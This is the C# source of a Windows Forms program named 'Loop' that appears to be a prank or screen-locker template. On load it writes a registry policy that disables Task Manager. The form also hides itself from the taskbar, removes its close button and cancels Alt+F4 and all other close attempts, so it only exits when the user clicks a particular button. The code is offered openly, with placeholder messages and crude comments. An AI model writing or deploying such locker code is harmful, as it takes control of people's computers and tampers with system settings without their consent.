using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security.Principal;



namespace Loop
{

    public partial class Form1 : Form
    {
        //task manager fixer
        public void enable()
        {
            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            objRegistryKey.DeleteValue("DisableTaskMgr");
            objRegistryKey.Close();
        }

        //task manager fucker
        public void disable()
        {
            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            if (objRegistryKey.GetValue("DisableTaskMgr") == null)
                objRegistryKey.SetValue("DisableTaskMgr", "1");
        }

        //taskbar fucker
        private Boolean flagunload = false;

        private void Form1_Load(object sender, EventArgs e)
        {
            this.ShowInTaskbar = false; //doesn't show form in taskbar..
                                        //MDI application make the parent showintaskbar false
            this.ControlBox = false;
            //Doesn't show the X and minimize and maximize button on form
            //You can use your interop or CreateParameter() do disable X as you did
        }

        //Alt + F4 fucker 
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (flagunload == true)
            {
            }
            else
            {
                e.Cancel = true;
            }
            //Alt + F4 will also not work 
        }


        //override close button for it don't work and task manager fuck
        protected override CreateParams CreateParams
        {
            get
            {
                disable();
                const int CS_NOCLOSE = 0x200;

                CreateParams cp = base.CreateParams;
                cp.ClassStyle |= CS_NOCLOSE;
                return cp;
            }
        }


        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            enable();// fix task manager
            MessageBox.Show("Custom Text here"); //text for positive answer
            Application.Exit();//loop end bcs positive answer
        }

        private void button2_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Custom Text here"); //text for negative answer
            //if you dont want have a answer just remove above line
        }

    }
}
